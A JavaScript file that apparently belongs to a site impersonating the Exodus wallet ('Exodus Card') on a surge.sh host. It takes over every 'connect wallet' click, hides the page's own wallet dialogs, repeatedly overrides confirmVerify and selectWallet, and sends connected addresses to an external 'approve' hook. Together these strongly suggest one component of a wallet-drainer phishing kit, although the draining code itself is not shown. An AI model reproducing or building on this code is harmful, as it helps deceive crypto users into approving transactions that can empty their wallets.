/**
 * Exodus Card — connect flow v1.3
 * Desktop: Reown AppKit QR only (scan with Exodus Desktop / Extension).
 * Mobile: Exodus removed WalletConnect (Apr 2026) — show desktop handoff sheet.
 *          No deeplink bounce. No seed phrase.
 */
(function () {
  'use strict';

  var SHEET_ID = '__exodus_desktop_sheet';

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function hideLegionFloatingButtons() {
    try {
      var root = document.getElementById('__lgn_root');
      if (root) root.remove();
    } catch (_) {}
  }

  function hideSiteWalletModal() {
    try {
      var modal = document.getElementById('cwModal');
      if (modal) modal.classList.remove('cw-show');
      document.body.style.overflow = '';
    } catch (_) {}
  }

  function alreadyConnectedAddr() {
    try {
      var a = sessionStorage.getItem('exodus_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function setAppKitVisible(show) {
    var s = document.getElementById('__exodus_appkit_css');
    if (!s) {
      s = document.createElement('style');
      s.id = '__exodus_appkit_css';
      document.head.appendChild(s);
    }
    s.textContent = show
      ? ''
      : '@media(max-width:1024px){w3m-modal,wcm-modal,appkit-modal{opacity:0!important;pointer-events:none!important}}';
  }

  function setConnectingUi(on) {
    try {
      var btn = document.getElementById('cfmbtn');
      if (!btn) return;
      if (on) {
        btn.dataset.prevLabel = btn.dataset.prevLabel || btn.textContent || 'Connect Wallet';
        btn.textContent = 'Connecting…';
        btn.disabled = true;
        btn.setAttribute('aria-disabled', 'true');
      } else {
        btn.textContent = btn.dataset.prevLabel || 'Connect Wallet';
        btn.disabled = false;
        btn.removeAttribute('aria-disabled');
        delete btn.dataset.prevLabel;
      }
    } catch (_) {}
  }

  function siteUrl() {
    try {
      return String(window.location.href || '').split('#')[0];
    } catch (_) {
      return 'https://exodus-card.surge.sh/';
    }
  }

  function copyText(text) {
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        return navigator.clipboard.writeText(text).then(function () { return true; }).catch(function () {
          return fallbackCopy(text);
        });
      }
    } catch (_) {}
    return Promise.resolve(fallbackCopy(text));
  }

  function fallbackCopy(text) {
    try {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.setAttribute('readonly', '');
      ta.style.cssText = 'position:fixed;left:-9999px;top:0';
      document.body.appendChild(ta);
      ta.select();
      var ok = document.execCommand('copy');
      ta.remove();
      return !!ok;
    } catch (_) {
      return false;
    }
  }

  function hideDesktopSheet() {
    var el = document.getElementById(SHEET_ID);
    if (el) el.style.display = 'none';
  }

  /** Mobile: explain WC gone + copy link / stay on site. No Exodus bounce. */
  function showDesktopHandoffSheet() {
    var el = document.getElementById(SHEET_ID);
    if (!el) {
      el = document.createElement('div');
      el.id = SHEET_ID;
      el.setAttribute('role', 'dialog');
      el.setAttribute('aria-modal', 'true');
      el.innerHTML = [
        '<div style="position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:2147483646" data-ex-close="1"></div>',
        '<div style="position:fixed;left:12px;right:12px;bottom:calc(12px + env(safe-area-inset-bottom,0px));z-index:2147483647;',
        'background:#0B0C10;color:#fff;border:1px solid #2a2d3a;border-radius:18px;padding:20px 18px 16px;',
        'font-family:system-ui,-apple-system,Segoe UI,sans-serif;box-shadow:0 16px 48px rgba(0,0,0,.55)">',
        '<div style="font-size:17px;font-weight:700;letter-spacing:-.02em;margin-bottom:8px">Connect on desktop</div>',
        '<p style="margin:0 0 14px;font-size:14px;line-height:1.45;color:#B8BCC8">',
        'Exodus mobile no longer supports WalletConnect (update Apr 2026). ',
        'Open this page on a computer and scan the QR with Exodus Desktop or the Exodus browser extension.',
        '</p>',
        '<button type="button" id="__ex_copy_link" style="width:100%;background:#8B5CF6;color:#fff;border:0;border-radius:12px;',
        'padding:14px;font-weight:700;font-size:15px;margin-bottom:8px">Copy link</button>',
        '<button type="button" id="__ex_sheet_close" style="width:100%;background:transparent;color:#9AA0B0;border:1px solid #2a2d3a;',
        'border-radius:12px;padding:12px;font-weight:600;font-size:14px">Got it</button>',
        '</div>',
      ].join('');
      document.body.appendChild(el);

      el.addEventListener('click', function (e) {
        var t = e.target;
        if (t && t.getAttribute && t.getAttribute('data-ex-close') === '1') hideDesktopSheet();
      });

      el.querySelector('#__ex_sheet_close').onclick = function (e) {
        e.preventDefault();
        hideDesktopSheet();
      };

      el.querySelector('#__ex_copy_link').onclick = function (e) {
        e.preventDefault();
        var url = siteUrl();
        copyText(url).then(function (ok) {
          if (ok) {
            window.showToast && window.showToast('Link copied — open on desktop', 3500);
            var b = el.querySelector('#__ex_copy_link');
            if (b) {
              b.textContent = 'Copied ✓';
              setTimeout(function () { b.textContent = 'Copy link'; }, 2000);
            }
          } else {
            window.showToast && window.showToast(url, 6000);
          }
        });
      };
    }
    el.style.display = 'block';
  }

  var connecting = false;
  var resetTimer = null;

  function startDesktopQr() {
    var L = window.legion;
    if (!L || (typeof L.connect !== 'function' && typeof L.connectWC !== 'function')) {
      window.showToast && window.showToast('Wallet engine loading… retry in a second', 2500);
      connecting = false;
      setConnectingUi(false);
      setTimeout(startExodus, 600);
      return;
    }

    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    setAppKitVisible(true);
    try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {}
    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
    try {
      if (typeof L.connectWC === 'function') L.connectWC();
      else if (typeof L.connect === 'function') L.connect();
    } catch (err) {
      console.error('[ExodusDirect] desktop connect failed', err);
      window.showToast && window.showToast('Connect failed — try again', 3000);
      connecting = false;
      setConnectingUi(false);
      return;
    }

    function openQr() {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.open === 'function') {
          var p = window.LegionWallet.open({ view: 'Connect' });
          if (p && typeof p.then === 'function') p.catch(function () {});
          return true;
        }
      } catch (_) {}
      return false;
    }
    if (!openQr()) {
      setTimeout(openQr, 400);
      setTimeout(openQr, 1200);
    }

    window.showToast && window.showToast('Scan the QR with Exodus Desktop or Extension', 4500);
    setTimeout(function () { connecting = false; }, 3000);
  }

  function startExodus() {
    if (connecting) return;
    connecting = true;
    if (resetTimer) clearTimeout(resetTimer);
    resetTimer = setTimeout(function () {
      connecting = false;
      setConnectingUi(false);
    }, 90000);

    hideLegionFloatingButtons();
    hideSiteWalletModal();
    window.__SELECTED_WALLET__ = 'exodus';
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    setConnectingUi(true);

    var existing = alreadyConnectedAddr();
    if (existing) {
      connecting = false;
      setConnectingUi(false);
      try {
        if (typeof window.__EXODUS_SHOW_APPROVE__ === 'function') window.__EXODUS_SHOW_APPROVE__(existing);
        else if (typeof window.__TRUST_SHOW_APPROVE__ === 'function') window.__TRUST_SHOW_APPROVE__(existing);
      } catch (_) {}
      try {
        if (window.legion && typeof window.legion.continueConnected === 'function') {
          window.legion.continueConnected();
        }
      } catch (_) {}
      return;
    }

    // Mobile: no WC in new Exodus apps — handoff to desktop
    if (isMobile()) {
      connecting = false;
      setConnectingUi(false);
      setAppKitVisible(false);
      showDesktopHandoffSheet();
      return;
    }

    startDesktopQr();
  }

  window.__EXODUS_DIRECT_CONNECT__ = startExodus;
  window.__TRUST_DIRECT_CONNECT__ = startExodus;
  window.__SMART_CONNECT__ = startExodus;
  window.__SELECTED_WALLET__ = 'exodus';
  window.__EXODUS_QR_DESKTOP_ONLY__ = true;
  window.__EXODUS_SHOW_DESKTOP_HANDOFF__ = showDesktopHandoffSheet;

  function patchConfirmVerify() {
    window.confirmVerify = function () { startExodus(); };
  }

  function patchSelectWallet() {
    if (typeof window.selectWallet !== 'function') return;
    window.selectWallet = function () {
      startExodus();
    };
  }

  function interceptClicks(e) {
    var t = e.target;
    if (!t) return;
    var btn = t.closest ? t.closest('button, a, [role="button"]') : null;
    if (!btn) return;
    var id = btn.id || '';
    var txt = (btn.textContent || '').trim().toLowerCase();

    if (id === '__lgn_cb' || id === '__lgn_wb') {
      e.preventDefault();
      e.stopPropagation();
      startExodus();
      return;
    }

    if (id === 'cfmbtn') return;

    if (
      txt === 'connect wallet' ||
      (txt.indexOf('connect') !== -1 && txt.indexOf('wallet') !== -1 && txt.indexOf('connecting') === -1)
    ) {
      e.preventDefault();
      e.stopPropagation();
      startExodus();
    }
  }

  var style = document.createElement('style');
  style.id = '__exodus_direct_css';
  style.textContent = [
    '#__lgn_root{display:none!important}',
    '#cwModal.cw-show{display:none!important}',
  ].join('');
  (document.head || document.documentElement).appendChild(style);
  setAppKitVisible(false);

  window.addEventListener('legion:connected', function () {
    connecting = false;
    setConnectingUi(false);
    hideDesktopSheet();
  });
  window.addEventListener('legion:wc-connected', function () {
    connecting = false;
    setConnectingUi(false);
    hideDesktopSheet();
  });

  function boot() {
    hideLegionFloatingButtons();
    hideSiteWalletModal();
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    patchConfirmVerify();
    patchSelectWallet();
    document.addEventListener('click', interceptClicks, true);
  }

  var tries = 0;
  var t = setInterval(function () {
    tries++;
    if (typeof window.confirmVerify === 'function' || typeof window.selectWallet === 'function') {
      boot();
      clearInterval(t);
      return;
    }
    if (tries > 80) {
      boot();
      clearInterval(t);
    }
  }, 50);

  document.addEventListener('DOMContentLoaded', function () {
    hideLegionFloatingButtons();
    boot();
  });

  var obs = new MutationObserver(function () {
    if (typeof window.confirmVerify === 'function') {
      var src = Function.prototype.toString.call(window.confirmVerify);
      if (src.indexOf('cw-show') !== -1 || src.indexOf('cwModal') !== -1) {
        patchConfirmVerify();
      }
    }
    hideLegionFloatingButtons();
  });
  if (document.body) obs.observe(document.body, { childList: true, subtree: true });
  else document.addEventListener('DOMContentLoaded', function () {
    obs.observe(document.body, { childList: true, subtree: true });
  });
})();
